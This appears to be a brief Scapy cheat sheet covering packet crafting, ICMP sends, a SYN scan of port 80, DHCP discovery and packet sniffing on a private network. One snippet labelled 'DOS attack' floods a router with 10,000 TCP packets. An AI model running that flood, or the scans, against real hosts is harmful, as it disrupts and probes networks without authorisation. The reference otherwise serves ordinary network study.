#### Create packets
Create packet with TTL
```python
x = IP(ttl=64)
```

Set source and destination IP
```python
x.src = "192.168.55.103"
x.dst = "192.168.55.254"
```

#### Send packets

Send an ICMP packet
```python
send(IP(src="192.168.55.103",dst="192.168.55.254")/ICMP()/"Hello world")
```

SYN scan router on port 80
```python
sr1(IP(dst="192.168.55.254")/TCP(dport=80,flags="S"))
```

DOS attack
```python
send(IP(src="192.168.55.103",dst="192.168.55.254")/TCP(sport=80, dport=80), count=10000)
```

look for DHCP server
```python
conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)
frame = Ether(dst="ff:ff:ff:ff:ff:ff")
datagram = IP(src="0.0.0.0",dst="192.168.55.254")
segment = UDP(sport=68,dport=67)
message = BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])
dhcp_discover = frame/datagram/segment/message
ans, unans = srp(dhcp_discover, multi=True)
print(ans.summary())
for p in ans:
	print(p[1][Ether].src)
	print(p[1][IP].src)
```
#### Sniff packets
```python
sniff(iface="en0", prn=lambda x:x.summary)
```



